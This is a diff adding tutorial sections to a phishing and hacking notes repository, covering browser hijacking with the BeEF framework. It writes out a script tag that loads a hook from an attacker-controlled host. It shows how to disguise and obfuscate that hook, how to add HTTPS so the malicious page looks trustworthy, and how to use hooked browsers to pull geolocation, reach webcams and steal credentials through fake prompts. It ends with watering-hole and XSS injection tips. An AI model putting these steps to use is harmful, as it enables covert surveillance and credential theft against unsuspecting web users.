@@ -272,3 +272,166 @@ Atrobin does not enforce Two Factor Authentication - 2FA - by default so it coul
 This raises the next problem - how can we get around 2FA?
 
 In this example, we are going to use a *browser-in-browser* attack...
+
+### Accessing the Cloud Server Desktop
+
+Even though this might not at first appear to have anything to do with bypassing 2FA it does indeed need to be done as a starting point.
+
+We can install a Graphical User Interface along with a VNC server on the cloud server and a VNC client on our local machine to interact graphically with the cloud server.
+
+>[!NOTE]
+>Will come back to finish this section on a browser-in-browser attack later...
+
+## Hacking Web Browsers
+
+We can hack browsers by embedding malicious javascript into our phishing pages.
+
+Javascript works on all modern web-browsers as it is used by developers to make websites interactive. It is a client side language which means it works on the client machine. Most people have javascript enabled on their web browser, so we can take advantage of this to hack their browsers.
+
+>[!NOTE]
+>It is possible to disable javascript in browser settings - if this is done then the attacks in this section will not work - most people never disable it though so the attacks will work in most cases
+
+### Installing BEEF
+
+Beef is a web browser exploitation framework. We can install it on kali using `sudo apt install beef-xss`
+
+Once we have installed it we will need to change the default password otherwise it will not start. We can edit the default credentials by opening `/etc/beef-xss/config.yaml` as root.
+
+[!beef1](/images/55.png)
+
+We can then start beef using `sudo beef-xss start`
+
+[!beef2](/images/56.png)
+
+In order for victim browsers to connect to our malicious server which is running beef on the cloud we will need to open inbound connections for port 3000 since this is the port which beef runs on.
+
+[!beef3](/images/57.png)
+
+We can now navigate to the beef login page from any machine connected to the internet. The login page is found on port 3000 at `/ui/panel`
+
+[!beef4](/images/58.png)
+
+### Embedding Malicious Javascript
+
+We need to *hook* a victim browser to beef before we can exploit it. In order to do this, we need to embed a line of malicious javascript into the source code of the malicious webpage.
+
+A good place to insert this code is at the start of the `<head></head>` section.
+
+[!beef5](/images/59.png)
+
+The line of code is:
+
+```html
+<script src="http://gaqzirkalewu.astro-backyard.space:3000/hook.js"></script>
+```
+
+>[!NOTE]
+>In this example we are using a gibberish subdomain `gaqzirkalewu` for the domain earlier purchased `astro-backyard.space` so nobody inadvertently gets hooked
+
+The `hook.js` file contains malicious javascript which hooks the victim browser to beef.
+
+In its default form, the line of code is suspicious, so we can obfuscate it by renaming it and placing it into a directory on our cloud based web server. It is normal for javascript files to be placed into a directory called `/scripts` so this is where we place our malicious hook script - `/scripts/gallery.js` instead of `hook.js`
+
+[!beef6](/images/77.png)
+
+This should mask the intention of the file to a casual observer of the source code - most people never look at it anyway - but to avoid more thorough examination if we suspect our page will be subject to it we can use javascript obfuscation techniques. I have detailed some simple ones in my repo about [javascript deobfuscation](https://github.com/puzz00/deobfuscation/blob/main/deobfuscation.md#basic-obfuscation)
+
+We now need to socially engineer our target to visit the malicious webpage.
+
+>[!NOTE]
+>I will not go into detail about cloning the webpage and setting up a domain name for it as we covered this earlier in this repo
+
+The beauty of this technique is that the target only needs to go to the malicious page in order for their browser to get hooked into beef - the webpage does not need to be a login page - it could be anything - a blog, a picture gallery, a shopping site etc.
+
+As soon as the page loads, the javascript in the malicious file is loaded - providing javascript is enabled in the browser and it most often is - and we will see a new browser in our beef control panel on the cloud server.
+
+[!beef7](/images/60.png)
+
+[!beef8](/images/61.png)
+
+Once we see an online hooked browser, we can click on it and see lots of detail regarding it in the *Details* section. We can then run commands on it from the *Commands* section.
+
+[!beef9](/images/62.png)
+
+In this first example, we see that the browser has been successfully hooked because a simple prompt works.
+
+[!beef10](/images/63.png)
+
+[!beef11](/images/64.png)
+
+### Enabling HTTPS
+
+If we enable https on our malicious web page we will be able to run more intrusive commands on the victim browser since some of the commands will be prevented by the browser if there is no security certificate. The use of https also makes the webpage more believable.
+
+Earlier, it was mentioned that we need to make a note of where the cert and key were downloaded by `certbot` - we now need these locations as we will copy the cert and the key into `/usr/share/beef-xss` which is where beef keeps certs and keys.
+
+>[!TIP]
+>If you didnt note the path to them you can use `sudo find / -iname *privkey* 2>/dev/null` to find the key and `sudo find / -iname *fullchain* 2>/dev/null` to find the cert.
+
+We can then copy them to where they need to be:
+
+```bash
+sudo cp /etc/letsencrypt/live/gaqzirkalewu.astro-backyard.space/privkey.pem /usr/share/beef-xss
+
+sudo cp /etc/letsencrypt/live/gaqzirkalewu.astro-backyard.space/fullchain.pem /usr/share/beef-xss
+```
+
+[!beef12](/images/65.png)
+
+We now need to make some amendments to the `/etc/beef-xss/config.yaml` file as shown in the pictures below.
+
+[!beef13](/images/66.png)
+
+[!beef14](/images/67.png)
+
+We can now access the https version of the beef control panel.
+
+[!beef15](/images/68.png)
+
+We need to change the source code of our malicious webpage so https is specified rather than http.
+
+[!beef16](/images/69.png)
+
+The target will now see a padlock and https being used on our malicious webpage.
+
+[!beef17](/images/70.png)
+
+### Exploiting the Browser
+
+With https enabled, we can now run more intrusive commands. There are lots of things we can do once a browser has been hooked. We will look at some of them here but it is worthwhile reading over and testing others in the *Commands* section of beef.
+
+#### Getting Location Data
+
+We can already get a rough idea of where the target is from their IP address which we will see in the *Hooked Browsers* section. We can use an online IP location service to do this.
+
+With https enabled, we can attempt to get an exact location of the target via geolocation. This will ask for permission from the victim via a pop-up. Social engineering once again comes into play - we will need the victim to allow access to their location via clever trickery.
+
+[!beef18](/images/71.png)
+
+[!beef19](/images/72.png)
+
+We can run the `Webcam HTML5` command to attempt to access the victims webcam. Again, they will need to give permission via a pop-up.
+
+[!beef20](/images/73.png)
+
+Regarding social engineering endeavours, there are lots of useful commands in beef to help us with these. A great one is `Pretty Theft` which lets us craft a simple `div` which will attempt to socially engineer the victim into sending credentials to us.
+
+[!beef21](/images/74.png)
+
+[!beef6](/images/75.png)
+
+[!beef6](/images/76.png)
+
+### Conclusion
+
+As we can see, hacking a web-browser can easily be achieved using malicious javascript. We could write our own, but it makes a lot more sense to use an exploitation framework such as beef.
+
+The beauty of this technique is that the victim will not see anything unusual happening as they are hooked to beef and they only need to visit a poisoned page which they can be socially engineered into visiting.
+
+Once a browser has been hooked to beef there are lots of ways we can exploit it - the commands covered here are but a few.
+
+>[!TIP]
+>We can run *watering hole* attacks with beef - we just put the hook into a phishing webpage which has been designed so people might inadvertently land on it via fat fingering URLs or other means - we can then attempt to harvest credentials such as the facebook ones given earlier in the `Pretty Theft` example
+>If we find an *XSS* vulnerability - we can place our javascript beef hook onto a legitimate website via it
+>We can even use our beef hook in a *honeypot* website which we have crafted
+
